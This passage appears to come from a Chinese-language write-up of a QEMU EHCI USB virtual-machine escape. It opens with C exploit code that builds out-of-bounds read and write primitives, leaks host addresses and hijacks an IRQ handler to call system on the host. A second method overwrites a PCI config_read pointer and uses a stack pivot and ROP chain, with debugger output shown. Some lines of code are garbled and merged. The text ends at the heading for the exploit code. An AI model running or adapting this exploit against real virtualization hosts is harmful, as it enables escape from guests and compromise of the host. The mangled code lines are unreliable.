    };
    typedef struct EHCIqh {
        uint32_t next;                    /* Standard next link pointer */
        /* endpoint characteristics */
        uint32_t epchar;
        /* endpoint capabilities */
        uint32_t epcap;
        uint32_t current_qtd;             /* Standard next link pointer */
        uint32_t next_qtd;                /* Standard next link pointer */
        uint32_t altnext_qtd;
        uint32_t token;                   /* Same as QTD token */
        uint32_t bufptr[5];               /* Standard buffer pointer */
    } EHCIqh;
    typedef struct EHCIqtd {
        uint32_t next;                    /* Standard next link pointer */
        uint32_t altnext;                 /* Standard next link pointer */
        uint32_t token;
        uint32_t bufptr[5];               /* Standard buffer pointer */
    } EHCIqtd;
    uint64_t virt2phys(void* p)
    {
        uint64_t virt = (uint64_t)p;
        // Assert page alignment
        int fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd == -1)
            die("open");
        uint64_t offset = (virt / 0x1000) * 8;
        lseek(fd, offset, SEEK_SET);
        uint64_t phys;
        if (read(fd, &phys, 8 ) != 8)
            die("read");
        // Assert page present
        phys = (phys & ((1ULL epchar = 0x00;
        qh->token = QTD_TOKEN_ACTIVE;
        qh->current_qtd = virt2phys(qtd);
    }
    void init_state(){
        reset_enable_port();
        set_qh();
        setup_buf[6] = 0xff;
        setup_buf[7] = 0x0;
        qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP bufptr[0] = virt2phys(setup_buf);
        *entry = virt2phys(qh)+0x2;
        set_EHCIState();
    }
    void set_length(uint16_t len,uint8_t option){
        reset_enable_port();
        set_qh();
        setup_buf[0] = option;
        setup_buf[6] = len & 0xff;
        setup_buf[7] = (len >> 8 ) & 0xff;
        qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP bufptr[0] = virt2phys(setup_buf);
        set_EHCIState();
    }
    void do_copy_read(){
        reset_enable_port();
        set_qh();
        qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN bufptr[0] = virt2phys(data_buf);
        qtd->bufptr[1] = virt2phys(data_buf_oob);
        set_EHCIState();
    }
    void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index){
        reset_enable_port();
        set_qh();
        *(unsigned long *)(data_buf_oob + offset) = 0x0000000200000002; // 覆盖成原先的内容
        *(unsigned int *)(data_buf_oob + 0x8 +offset) = setup_len; //setup_len
        *(unsigned int *)(data_buf_oob + 0xc+ offset) = setup_index;
        qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT bufptr[0] = virt2phys(data_buf);
        qtd->bufptr[1] = virt2phys(data_buf_oob);
        set_EHCIState();
    }
    void setup_state_data(){
        set_length(0x500, USB_DIR_OUT);
    }
    void arb_write(uint64_t target_addr, uint64_t payload)
    {
        setup_state_data();
        set_length(0x1010, USB_DIR_OUT);
        unsigned long offset = target_addr - data_buf_addr;
        do_copy_write(0, offset+0x8, offset-0x1010);
        *(unsigned long *)(data_buf) = payload;
        do_copy_write(0, 0xffff, 0);
    }
    unsigned long arb_read(uint64_t target_addr)
    {
        setup_state_data();
        set_length(0x1010, USB_DIR_OUT);
        do_copy_write(0, 0x1010, 0xfffffff8-0x1010);
        *(unsigned long *)(data_buf) = 0x2000000000000080; // set setup[0] -> USB_DIR_IN
        unsigned int target_offset = target_addr - data_buf_addr;
        do_copy_write(0x8, 0xffff, target_offset - 0x1018);
        do_copy_read(); // oob read
        return *(unsigned long *)(data_buf);
    }
    int main()
    {
        init();
        iopl(3);
        outw(0,0xc080);
        outw(0,0xc0a0);
        outw(0,0xc0c0);
        sleep(3);
        init_state();
        set_length(0x2000, USB_DIR_IN);
        do_copy_read(); // oob read
        struct USBDevice* usb_device_tmp = data_buf + 0x4;
        struct USBDevice usb_device;
        memcpy(&usb_device,usb_device_tmp,sizeof(USBDevice));
        dev_addr = usb_device.ep_ctl.dev;
        data_buf_addr = dev_addr + 0xdc;
        USBPort_addr = dev_addr + 0x78;
        printf("USBDevice dev_addr: 0x%llx\n", dev_addr);
        printf("USBDevice->data_buf: 0x%llx\n", data_buf_addr);
        printf("USBPort_addr: 0x%llx\n", USBPort_addr);
        uint64_t *tmp=dmabuf+0x24f4+8;
        long long leak_addr = *tmp;
        if(leak_addr == 0){
            printf("INIT DOWN,DO IT AGAIN\n");
            return 0;
        }
        long long base = leak_addr - 0xc40d90;
        uint64_t system_plt = base + 0x290D30;
        printf("leak elf_base address : %llx!\n", base);
        printf("leak system_plt address: %llx!\n", system_plt);
        unsigned long USBPort_ptr = arb_read(USBPort_addr);
        unsigned long EHCIState_addr = USBPort_ptr - 0x540;
        unsigned long irq_addr = EHCIState_addr + 0xc0;
        unsigned long fake_irq_addr = data_buf_addr; //dev_addr + 0xdc;   
        unsigned long irq_ptr = arb_read(irq_addr);
        printf("EHCIState_addr: 0x%llx\n", EHCIState_addr);
        printf("USBPort_ptr: 0x%llx\n", USBPort_ptr);
        printf("irq_addr: 0x%llx\n", irq_addr);
        printf("fake_irq_addr: 0x%llx\n", fake_irq_addr);
        printf("irq_ptr: 0x%llx\n", irq_ptr);
        // construct fake_irq
        setup_state_data();
        *(unsigned long *)(data_buf + 0x28) = system_plt; // handler
        *(unsigned long *)(data_buf + 0x30) = dev_addr+0xdc+0x100; //opaque
        *(unsigned long *)(data_buf + 0x38) = 0x3; //n
        *(unsigned long *)(data_buf + 0x100) = 0x636c616378; // "xcalc"
        do_copy_write(0, 0xffff, 0xffff);
        // write fake_irq
        arb_write(irq_addr, fake_irq_addr);
        // write back  irq_ptr
        arb_write(irq_addr, irq_ptr);
        //printf("success233!\n");
    };
运行效果图：
## 漏洞利用二
利用思路参考[https://isc.360.com/2020/detail.html?vid=108&id=17](https://isc.360.com/2020/detail.html?vid=108&id=17)
该思路需要qemu启动时加载qxl-vga设备，配置见上面的环境搭建。
（1）通过越界读获取 USBdevice
对象的地址，这里通过读取dmabuf+0x2004可以得到USBDevice->remote_wakeup的内容（这里+4是因为结构体的内存对齐）。往下读有一个
USBEndpoint ep_ctl 结构体，ep_ctl->dev 保存着USBdevice 对象的地址，就可以泄露 USBdevice
对象的地址。计算偏移就可以获得data_buf 和USBPort 字段的地址。
（2）利用任意读泄露 data_buf后面的内存数据，遍历查找“qxl-vga”字符串找到PCIDevice->name的地址，减去偏移得到PCIDevice结构体地址。
    struct PCIDevice {
       …………
        PCIReqIDCache requester_id_cache;
        char name[64]; // ->保存设备的名字，"qxl-vga"
        PCIIORegion io_regions[PCI_NUM_REGIONS];
        AddressSpace bus_master_as;
        MemoryRegion bus_master_container_region;
        MemoryRegion bus_master_enable_region;
        /* do not access the following fields */
        PCIConfigReadFunc *config_read;
        PCIConfigWriteFunc *config_write;
        /* Legacy PCI VGA regions */
        MemoryRegion *vga_regions[QEMU_PCI_VGA_NUM_REGIONS];
        bool has_vga;
       …………
    };
（3）利用任意写，可以修改config_read保存的函数指针，在虚拟机里读取pci配置寄存器（调用system("lspci")）就可以触发config_read保存的函数指针，实际上是调用pci_default_read_config函数。将函数指针修改成system@plt地址，就可以调用system函数。
（4）到第（3）步就可以控制rip，但是传参有些问题，调用函数指针在pci_host_config_read_common函数中：
    uint32_t pci_host_config_read_common(PCIDevice *pci_dev, uint32_t addr,
                                         uint32_t limit, uint32_t len)
    {
        uint32_t ret;
        pci_adjust_config_limit(pci_get_bus(pci_dev), &limit);// qdev.hotplugged && !pci_get_function_0(pci_dev)) {
            return ~0x0;
        }
        ret = pci_dev->config_read(pci_dev, addr, MIN(len, limit - addr));
        trace_pci_cfg_read(pci_dev->name, PCI_SLOT(pci_dev->devfn),
                           PCI_FUNC(pci_dev->devfn), addr, ret);
        return ret;
    }
此时将payload写入pci_dev中，但pci_adjust_config_limit(pci_get_bus(pci_dev), &limit);
这句会调用到object_dynamic_cast_assert。
    pci_adjust_config_limit(pci_get_bus(pci_dev), &limit);
    ->
       770 Object *object_dynamic_cast_assert(Object *obj, const char *typename,
       771                                    const char *file, int line, const char *func)
       772 {
     ► 773     trace_object_dynamic_cast_assert(obj ? obj->class->type->name : "(null)",
       774                                      typename, file, line, func);
       775
object_dynamic_cast_assert里面有个寻址操作，因为我们覆盖了class为payload，所以寻址失败，导致崩溃。
    pwndbg> p/x *(struct PCIDevice *)0x55ba7a7befd0
    $14 = {
      qdev = {
        parent_obj = {
          class = 0x636c616378, 
          free = 0x7f29c95305c0,
到这里，传参这部分没有得到解决，想着泄露libc地址，覆盖rip为one_gadget，但本地环境没有满足条件的one_gadget，所以转而使用rop
链进行利用。
首先覆盖rip为0xdeadbeef， 观察寄存器，之前我们覆盖rdi为"xcalc"字符串地址失败是因为之前有寻址操作。
但是我们可以看到rax保存的是堆地址，所以第一步就是进行栈切换，将rsp切换到堆上。但笔者编译的qemu程序没有直接"xchg rax, rsp;
ret;"这种gadget，但找到了：
    xchg rax, rbp; mov cl, 0xff; mov eax, dword ptr [rbp - 0x10]; leave; ret;
可以将rax的值给rbp后，再通过leave指令（相当于mov rsp, rbp; pop
rbp;），间接将rax的值赋给rsp，完成栈切换。之后的的rop链就没有什么障碍：
    new rsp  ===>   [0x00] : pop rax; ret; 
                    [0x08] : system@plt                               
                    [0x10] : pop rdi; ret;
                /-- [0x18] : rsp+0x30       
                |   [0x20] : sub al, 0; call rax; 
                |   [0x28] :                                 
                |-> [0x30] : "xcalc"
完成利用。
exp代码：